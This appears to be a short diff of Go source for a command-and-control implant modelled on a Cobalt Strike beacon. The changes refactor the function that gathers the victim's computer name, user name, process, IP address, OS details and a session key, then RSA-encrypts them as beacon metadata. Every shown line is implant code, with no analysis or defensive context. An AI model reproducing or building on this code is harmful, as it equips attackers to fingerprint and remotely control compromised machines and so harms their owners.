@@ -11,11 +11,11 @@ import (
 
 var (
 	Counter  int
-	MetaInfo string
 	BeaconID = GetID()
+	MetaByte = MetaInit()
 )
 
-func MetaInit() ([]byte, string) {
+func MetaInit() []byte {
 	Key       := RandomKey(16)
 	ANSI      := IntToByte(2, 59901)
 	OEM       := IntToByte(2, GetOEM())
@@ -32,7 +32,8 @@ func MetaInit() ([]byte, string) {
 
 	Magic     := IntToByte(4, 48879)
 	Meta      := JoinBytes(Key, ANSI, OEM, ID, PID, Port, Flag, OSVer, Build, PTR, PTR_GMH, PTR_GPA, IPAddress, []byte(fmt.Sprintf("%s (%s)\t%s\t%s", GetComputer(), strings.Title(runtime.GOOS), GetUserName(), GetProcess())))
-	return RSAEncrypt(JoinBytes(Magic, IntToByte(4, len(Meta)), Meta))
+	Raw, _    := RSAEncrypt(JoinBytes(Magic, IntToByte(4, len(Meta)), Meta))
+	return Raw
 }
 
 func MakeBytes(Type int, Data []byte) {
